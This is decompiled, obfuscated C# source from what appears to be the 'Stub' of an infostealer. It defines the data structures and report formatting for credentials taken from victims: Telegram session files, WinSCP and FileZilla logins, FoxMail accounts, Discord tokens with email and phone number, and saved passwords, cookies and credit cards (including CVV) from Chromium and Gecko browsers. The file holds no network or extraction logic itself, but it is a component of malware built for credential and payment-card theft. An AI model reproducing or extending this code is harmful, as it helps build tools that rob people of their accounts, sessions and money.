using System;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x0200001B RID: 27
	public static class DataExtractionStructs
	{
		// Token: 0x060000A8 RID: 168 RVA: 0x000038AD File Offset: 0x00001AAD
		static DataExtractionStructs()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		}

		// Token: 0x0200001C RID: 28
		public struct TelegramInfo
		{
			// Token: 0x060000A9 RID: 169 RVA: 0x00003AE5 File Offset: 0x00001CE5
			public TelegramInfo(string _rootPath, string[] _files)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.rootPath = _rootPath;
				this.files = _files;
			}

			// Token: 0x060000AA RID: 170 RVA: 0x000038AD File Offset: 0x00001AAD
			static TelegramInfo()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x04000096 RID: 150
			public string rootPath;

			// Token: 0x04000097 RID: 151
			public string[] files;
		}

		// Token: 0x0200001D RID: 29
		public struct WinScpInfo
		{
			// Token: 0x060000AB RID: 171 RVA: 0x00003AFA File Offset: 0x00001CFA
			public WinScpInfo(string _hostname, int _port, string _username, string _password)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.hostname = _hostname;
				this.port = _port;
				this.username = _username;
				this.password = _password;
			}

			// Token: 0x060000AC RID: 172 RVA: 0x00009DE0 File Offset: 0x00007FE0
			public override string ToString()
			{
				string text = "Hostname: " + this.hostname;
				text += Environment.NewLine;
				text = text + "Port: " + this.port.ToString();
				text += Environment.NewLine;
				text = text + "Username: " + this.username;
				text += Environment.NewLine;
				return text + "Password: " + this.password;
			}

			// Token: 0x060000AD RID: 173 RVA: 0x000038AD File Offset: 0x00001AAD
			static WinScpInfo()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x04000098 RID: 152
			public string hostname;

			// Token: 0x04000099 RID: 153
			public int port;

			// Token: 0x0400009A RID: 154
			public string username;

			// Token: 0x0400009B RID: 155
			public string password;
		}

		// Token: 0x0200001E RID: 30
		public struct FileZillaInfo
		{
			// Token: 0x060000AE RID: 174 RVA: 0x00003B1E File Offset: 0x00001D1E
			public FileZillaInfo(string _host, int _port, string _username, string _password)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.host = _host;
				this.port = _port;
				this.username = _username;
				this.password = _password;
			}

			// Token: 0x060000AF RID: 175 RVA: 0x00009E60 File Offset: 0x00008060
			public override string ToString()
			{
				string text = "Host: " + this.host;
				text += Environment.NewLine;
				text = text + "Port: " + this.port.ToString();
				text += Environment.NewLine;
				text = text + "Username: " + this.username;
				text += Environment.NewLine;
				text = text + "Password: " + this.password;
				return text.ToString();
			}

			// Token: 0x060000B0 RID: 176 RVA: 0x000038AD File Offset: 0x00001AAD
			static FileZillaInfo()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x0400009C RID: 156
			public string host;

			// Token: 0x0400009D RID: 157
			public int port;

			// Token: 0x0400009E RID: 158
			public string username;

			// Token: 0x0400009F RID: 159
			public string password;
		}

		// Token: 0x0200001F RID: 31
		public struct FoxMailInfo
		{
			// Token: 0x060000B1 RID: 177 RVA: 0x00003B42 File Offset: 0x00001D42
			public FoxMailInfo(string _account, string _password, bool _pop3, string _smtpserver, string _smtpport)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.account = _account;
				this.password = _password;
				this.pop3 = _pop3;
				this.smtpserver = _smtpserver;
				this.smtpport = _smtpport;
			}

			// Token: 0x060000B2 RID: 178 RVA: 0x00009EE8 File Offset: 0x000080E8
			public override string ToString()
			{
				string text = "Account: " + this.account;
				text += Environment.NewLine;
				text = text + "Password: " + this.password;
				text += Environment.NewLine;
				text = text + "Pop3: " + this.pop3.ToString().ToUpper();
				text += Environment.NewLine;
				text = text + "SMTP Server: " + this.smtpserver;
				text += Environment.NewLine;
				return text + "SMTP Port: " + this.smtpport;
			}

			// Token: 0x060000B3 RID: 179 RVA: 0x000038AD File Offset: 0x00001AAD
			static FoxMailInfo()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000A0 RID: 160
			public string account;

			// Token: 0x040000A1 RID: 161
			public string password;

			// Token: 0x040000A2 RID: 162
			public bool pop3;

			// Token: 0x040000A3 RID: 163
			public string smtpserver;

			// Token: 0x040000A4 RID: 164
			public string smtpport;
		}

		// Token: 0x02000020 RID: 32
		public struct DiscordUserData
		{
			// Token: 0x060000B4 RID: 180 RVA: 0x00003B6E File Offset: 0x00001D6E
			public DiscordUserData(string _token, string _username, string _email, string _phoneNumber, string _id, bool _hasNitro)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.token = _token;
				this.username = _username;
				this.email = _email;
				this.phoneNumber = _phoneNumber;
				this.id = _id;
				this.hasNitro = _hasNitro;
			}

			// Token: 0x060000B5 RID: 181 RVA: 0x00009F8C File Offset: 0x0000818C
			public override string ToString()
			{
				string text = "Token: " + this.token;
				text += Environment.NewLine;
				text = text + "Username: " + this.username;
				text += Environment.NewLine;
				text = text + "Email: " + this.email;
				text += Environment.NewLine;
				text = text + "Phone number: " + this.phoneNumber;
				text += Environment.NewLine;
				text = text + "Id: " + this.id;
				text += Environment.NewLine;
				return text + "Hasnitro: " + this.hasNitro.ToString();
			}

			// Token: 0x060000B6 RID: 182 RVA: 0x000038AD File Offset: 0x00001AAD
			static DiscordUserData()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000A5 RID: 165
			public string token;

			// Token: 0x040000A6 RID: 166
			public string username;

			// Token: 0x040000A7 RID: 167
			public string email;

			// Token: 0x040000A8 RID: 168
			public string phoneNumber;

			// Token: 0x040000A9 RID: 169
			public string id;

			// Token: 0x040000AA RID: 170
			public bool hasNitro;
		}

		// Token: 0x02000021 RID: 33
		[Flags]
		public enum ChromiumBrowserOptions
		{
			// Token: 0x040000AC RID: 172
			None = 0,
			// Token: 0x040000AD RID: 173
			Logins = 1,
			// Token: 0x040000AE RID: 174
			Cookies = 2,
			// Token: 0x040000AF RID: 175
			CreditCards = 4,
			// Token: 0x040000B0 RID: 176
			All = 7
		}

		// Token: 0x02000022 RID: 34
		public struct ChromiumBrowser
		{
			// Token: 0x060000B7 RID: 183 RVA: 0x0000A048 File Offset: 0x00008248
			public ChromiumBrowser(DataExtractionStructs.ChromiumProfile[] _profiles, string _browserName)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.browserName = _browserName;
				if (_profiles == null)
				{
					this.profiles = new DataExtractionStructs.ChromiumProfile[0];
				}
				else
				{
					this.profiles = _profiles;
				}
			}

			// Token: 0x060000B8 RID: 184 RVA: 0x000038AD File Offset: 0x00001AAD
			static ChromiumBrowser()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000B1 RID: 177
			public string browserName;

			// Token: 0x040000B2 RID: 178
			public DataExtractionStructs.ChromiumProfile[] profiles;
		}

		// Token: 0x02000023 RID: 35
		public struct ChromiumProfile
		{
			// Token: 0x060000B9 RID: 185 RVA: 0x0000A07C File Offset: 0x0000827C
			public ChromiumProfile(DataExtractionStructs.ChromiumLogin[] _logins, DataExtractionStructs.ChromiumCookie[] _cookies, DataExtractionStructs.ChromiumCreditCard[] _creditCards, string _profileName)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.profileName = _profileName;
				if (_logins == null)
				{
					this.logins = new DataExtractionStructs.ChromiumLogin[0];
				}
				else
				{
					this.logins = _logins;
				}
				if (_cookies == null)
				{
					this.cookies = new DataExtractionStructs.ChromiumCookie[0];
				}
				else
				{
					this.cookies = _cookies;
				}
				if (_creditCards == null)
				{
					this.creditCards = new DataExtractionStructs.ChromiumCreditCard[0];
				}
				else
				{
					this.creditCards = _creditCards;
				}
			}

			// Token: 0x060000BA RID: 186 RVA: 0x0000A0E8 File Offset: 0x000082E8
			public string GetLoginsString()
			{
				string text = "";
				foreach (DataExtractionStructs.ChromiumLogin chromiumLogin in this.logins)
				{
					text += chromiumLogin.ToString();
					text += Environment.NewLine;
					text += Environment.NewLine;
				}
				return text;
			}

			// Token: 0x060000BB RID: 187 RVA: 0x0000A14C File Offset: 0x0000834C
			public string GetCookiesString()
			{
				string text = "";
				foreach (DataExtractionStructs.ChromiumCookie chromiumCookie in this.cookies)
				{
					text += chromiumCookie.ToString();
					text += Environment.NewLine;
					text += Environment.NewLine;
				}
				return text;
			}

			// Token: 0x060000BC RID: 188 RVA: 0x0000A1B0 File Offset: 0x000083B0
			public string GetCreditCardsString()
			{
				string text = "";
				foreach (DataExtractionStructs.ChromiumCreditCard chromiumCreditCard in this.creditCards)
				{
					text += chromiumCreditCard.ToString();
					text += Environment.NewLine;
					text += Environment.NewLine;
				}
				return text;
			}

			// Token: 0x060000BD RID: 189 RVA: 0x000038AD File Offset: 0x00001AAD
			static ChromiumProfile()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000B3 RID: 179
			public string profileName;

			// Token: 0x040000B4 RID: 180
			public DataExtractionStructs.ChromiumLogin[] logins;

			// Token: 0x040000B5 RID: 181
			public DataExtractionStructs.ChromiumCookie[] cookies;

			// Token: 0x040000B6 RID: 182
			public DataExtractionStructs.ChromiumCreditCard[] creditCards;
		}

		// Token: 0x02000024 RID: 36
		public struct ChromiumCookie
		{
			// Token: 0x060000BE RID: 190 RVA: 0x0000A214 File Offset: 0x00008414
			public ChromiumCookie(string _domain, string _path, string _name, string _value, long _expiry, bool _isSecure, bool _isHttpOnly)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				_expiry /= 1000000L;
				_expiry -= 11644473600L;
				this.domain = _domain;
				this.path = _path;
				this.name = _name;
				this.value = _value;
				this.expiry = _expiry;
				this.isSecure = _isSecure;
				this.isHttpOnly = _isHttpOnly;
				this.expired = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds >= (double)_expiry;
			}

			// Token: 0x060000BF RID: 191 RVA: 0x0000A2A8 File Offset: 0x000084A8
			public override string ToString()
			{
				string text = "Domain: " + this.domain;
				text += Environment.NewLine;
				text = text + "Path: " + this.path;
				text += Environment.NewLine;
				text = text + "Name: " + this.name;
				text += Environment.NewLine;
				text = text + "Value: " + this.value;
				text += Environment.NewLine;
				text = text + "Expiry: " + this.expiry.ToString();
				text += Environment.NewLine;
				text = text + "Is_secure: " + this.isSecure.ToString();
				text += Environment.NewLine;
				text = text + "Is_http_only: " + this.isHttpOnly.ToString();
				text += Environment.NewLine;
				return text + "Expired: " + this.expired.ToString();
			}

			// Token: 0x060000C0 RID: 192 RVA: 0x000038AD File Offset: 0x00001AAD
			static ChromiumCookie()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000B7 RID: 183
			public string domain;

			// Token: 0x040000B8 RID: 184
			public string path;

			// Token: 0x040000B9 RID: 185
			public string name;

			// Token: 0x040000BA RID: 186
			public string value;

			// Token: 0x040000BB RID: 187
			public long expiry;

			// Token: 0x040000BC RID: 188
			public bool isSecure;

			// Token: 0x040000BD RID: 189
			public bool isHttpOnly;

			// Token: 0x040000BE RID: 190
			public bool expired;
		}

		// Token: 0x02000025 RID: 37
		public struct ChromiumLogin
		{
			// Token: 0x060000C1 RID: 193 RVA: 0x00003BA2 File Offset: 0x00001DA2
			public ChromiumLogin(string _username, string _password, string _hostname)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.hostname = _hostname;
				this.username = _username;
				this.password = _password;
			}

			// Token: 0x060000C2 RID: 194 RVA: 0x0000A3B0 File Offset: 0x000085B0
			public override string ToString()
			{
				string text = "Hostname: " + this.hostname;
				text += Environment.NewLine;
				text = text + "Username: " + this.username;
				text += Environment.NewLine;
				return text + "Password: " + this.password;
			}

			// Token: 0x060000C3 RID: 195 RVA: 0x000038AD File Offset: 0x00001AAD
			static ChromiumLogin()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000BF RID: 191
			public string hostname;

			// Token: 0x040000C0 RID: 192
			public string username;

			// Token: 0x040000C1 RID: 193
			public string password;
		}

		// Token: 0x02000026 RID: 38
		public struct ChromiumCreditCard
		{
			// Token: 0x060000C4 RID: 196 RVA: 0x00003BBE File Offset: 0x00001DBE
			public ChromiumCreditCard(string _cardholderName, string _cardNumber, string _cvv, int _expirationMonth, int _expirationYear)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.cardholderName = _cardholderName;
				this.cardNumber = _cardNumber;
				this.cvv = _cvv;
				this.expirationMonth = _expirationMonth;
				this.expirationYear = _expirationYear;
			}

			// Token: 0x060000C5 RID: 197 RVA: 0x0000A410 File Offset: 0x00008610
			public override string ToString()
			{
				string text = "Cardholder_name: " + this.cardholderName;
				text += Environment.NewLine;
				text = text + "Card_number: " + this.cardNumber;
				text += Environment.NewLine;
				text = text + "Cvv: " + this.cvv;
				text += Environment.NewLine;
				text = text + "Expiration_month: " + this.expirationMonth.ToString();
				text += Environment.NewLine;
				return text + "Expiration_year: " + this.expirationYear.ToString();
			}

			// Token: 0x060000C6 RID: 198 RVA: 0x000038AD File Offset: 0x00001AAD
			static ChromiumCreditCard()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000C2 RID: 194
			public string cardholderName;

			// Token: 0x040000C3 RID: 195
			public string cardNumber;

			// Token: 0x040000C4 RID: 196
			public string cvv;

			// Token: 0x040000C5 RID: 197
			public int expirationMonth;

			// Token: 0x040000C6 RID: 198
			public int expirationYear;
		}

		// Token: 0x02000027 RID: 39
		[Flags]
		public enum GeckoBrowserOptions
		{
			// Token: 0x040000C8 RID: 200
			None = 0,
			// Token: 0x040000C9 RID: 201
			Logins = 1,
			// Token: 0x040000CA RID: 202
			Cookies = 2,
			// Token: 0x040000CB RID: 203
			CreditCards = 4,
			// Token: 0x040000CC RID: 204
			All = 7
		}

		// Token: 0x02000028 RID: 40
		public struct GeckoBrowser
		{
			// Token: 0x060000C7 RID: 199 RVA: 0x0000A4B4 File Offset: 0x000086B4
			public GeckoBrowser(DataExtractionStructs.GeckoProfile[] _profiles, string _browserName)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.browserName = _browserName;
				if (_profiles == null)
				{
					this.profiles = new DataExtractionStructs.GeckoProfile[0];
				}
				else
				{
					this.profiles = _profiles;
				}
			}

			// Token: 0x060000C8 RID: 200 RVA: 0x000038AD File Offset: 0x00001AAD
			static GeckoBrowser()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000CD RID: 205
			public string browserName;

			// Token: 0x040000CE RID: 206
			public DataExtractionStructs.GeckoProfile[] profiles;
		}

		// Token: 0x02000029 RID: 41
		public struct GeckoProfile
		{
			// Token: 0x060000C9 RID: 201 RVA: 0x0000A4E8 File Offset: 0x000086E8
			public GeckoProfile(DataExtractionStructs.GeckoLogin[] logins, DataExtractionStructs.GeckoCookie[] cookies, DataExtractionStructs.GeckoCreditCard[] creditCards, string profileName)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.profileName = profileName;
				this.logins = logins ?? new DataExtractionStructs.GeckoLogin[0];
				this.cookies = cookies ?? new DataExtractionStructs.GeckoCookie[0];
				this.creditCards = creditCards ?? new DataExtractionStructs.GeckoCreditCard[0];
			}

			// Token: 0x060000CA RID: 202 RVA: 0x0000A538 File Offset: 0x00008738
			public string GetLoginsString()
			{
				string text = "";
				foreach (DataExtractionStructs.GeckoLogin geckoLogin in this.logins)
				{
					text += geckoLogin.ToString();
					text += Environment.NewLine;
					text += Environment.NewLine;
				}
				return text;
			}

			// Token: 0x060000CB RID: 203 RVA: 0x0000A59C File Offset: 0x0000879C
			public string GetCookiesString()
			{
				string text = "";
				foreach (DataExtractionStructs.GeckoCookie geckoCookie in this.cookies)
				{
					text += geckoCookie.ToString();
					text += Environment.NewLine;
					text += Environment.NewLine;
				}
				return text;
			}

			// Token: 0x060000CC RID: 204 RVA: 0x0000A600 File Offset: 0x00008800
			public string GetCreditCardsString()
			{
				string text = "";
				foreach (DataExtractionStructs.GeckoCreditCard geckoCreditCard in this.creditCards)
				{
					text += geckoCreditCard.ToString();
					text += Environment.NewLine;
					text += Environment.NewLine;
				}
				return text;
			}

			// Token: 0x060000CD RID: 205 RVA: 0x000038AD File Offset: 0x00001AAD
			static GeckoProfile()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000CF RID: 207
			public string profileName;

			// Token: 0x040000D0 RID: 208
			public DataExtractionStructs.GeckoLogin[] logins;

			// Token: 0x040000D1 RID: 209
			public DataExtractionStructs.GeckoCookie[] cookies;

			// Token: 0x040000D2 RID: 210
			public DataExtractionStructs.GeckoCreditCard[] creditCards;
		}

		// Token: 0x0200002A RID: 42
		public struct GeckoLogin
		{
			// Token: 0x060000CE RID: 206 RVA: 0x00003BEA File Offset: 0x00001DEA
			public GeckoLogin(string _username, string _password, string _hostname)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.hostname = _hostname;
				this.username = _username;
				this.password = _password;
			}

			// Token: 0x060000CF RID: 207 RVA: 0x0000A664 File Offset: 0x00008864
			public override string ToString()
			{
				string text = "Hostname: " + this.hostname;
				text += Environment.NewLine;
				text = text + "Username: " + this.username;
				text += Environment.NewLine;
				return text + "Password: " + this.password;
			}

			// Token: 0x060000D0 RID: 208 RVA: 0x000038AD File Offset: 0x00001AAD
			static GeckoLogin()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000D3 RID: 211
			public string hostname;

			// Token: 0x040000D4 RID: 212
			public string username;

			// Token: 0x040000D5 RID: 213
			public string password;
		}

		// Token: 0x0200002B RID: 43
		public struct GeckoCookie
		{
			// Token: 0x060000D1 RID: 209 RVA: 0x0000A6C4 File Offset: 0x000088C4
			public GeckoCookie(string _domain, string _path, string _name, string _value, int _expiry, bool _isSecure, bool _isHttpOnly)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.domain = _domain;
				this.path = _path;
				this.name = _name;
				this.value = _value;
				this.expiry = _expiry;
				this.isSecure = _isSecure;
				this.isHttpOnly = _isHttpOnly;
				this.expired = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds >= (double)_expiry;
			}

			// Token: 0x060000D2 RID: 210 RVA: 0x0000A73C File Offset: 0x0000893C
			public override string ToString()
			{
				string text = "Domain: " + this.domain;
				text += Environment.NewLine;
				text = text + "Path: " + this.path;
				text += Environment.NewLine;
				text = text + "Name: " + this.name;
				text += Environment.NewLine;
				text = text + "Value: " + this.value;
				text += Environment.NewLine;
				text = text + "Expiry: " + this.expiry.ToString();
				text += Environment.NewLine;
				text = text + "Is_secure: " + this.isSecure.ToString();
				text += Environment.NewLine;
				text = text + "Is_http_only: " + this.isHttpOnly.ToString();
				text += Environment.NewLine;
				return text + "Expired: " + this.expired.ToString();
			}

			// Token: 0x060000D3 RID: 211 RVA: 0x000038AD File Offset: 0x00001AAD
			static GeckoCookie()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000D6 RID: 214
			public string domain;

			// Token: 0x040000D7 RID: 215
			public string path;

			// Token: 0x040000D8 RID: 216
			public string name;

			// Token: 0x040000D9 RID: 217
			public string value;

			// Token: 0x040000DA RID: 218
			public int expiry;

			// Token: 0x040000DB RID: 219
			public bool isSecure;

			// Token: 0x040000DC RID: 220
			public bool isHttpOnly;

			// Token: 0x040000DD RID: 221
			public bool expired;
		}

		// Token: 0x0200002C RID: 44
		public struct GeckoCreditCard
		{
			// Token: 0x060000D4 RID: 212 RVA: 0x00003C06 File Offset: 0x00001E06
			public GeckoCreditCard(string _cardholderName, string _cardType, string _cardNumber, int _expirationMonth, int _expirationYear)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.cardholderName = _cardholderName;
				this.cardType = _cardType;
				this.cardNumber = _cardNumber;
				this.expirationMonth = _expirationMonth;
				this.expirationYear = _expirationYear;
			}

			// Token: 0x060000D5 RID: 213 RVA: 0x0000A844 File Offset: 0x00008A44
			public override string ToString()
			{
				string text = "Cardholder_name: " + this.cardholderName;
				text += Environment.NewLine;
				text = text + "Card_type: " + this.cardType;
				text += Environment.NewLine;
				text = text + "Card_number: " + this.cardNumber;
				text += Environment.NewLine;
				text = text + "Expiration_month: " + this.expirationMonth.ToString();
				text += Environment.NewLine;
				return text + "Expiration_year: " + this.expirationYear.ToString();
			}

			// Token: 0x060000D6 RID: 214 RVA: 0x000038AD File Offset: 0x00001AAD
			static GeckoCreditCard()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040000DE RID: 222
			public string cardholderName;

			// Token: 0x040000DF RID: 223
			public string cardType;

			// Token: 0x040000E0 RID: 224
			public string cardNumber;

			// Token: 0x040000E1 RID: 225
			public int expirationMonth;

			// Token: 0x040000E2 RID: 226
			public int expirationYear;
		}
	}
}
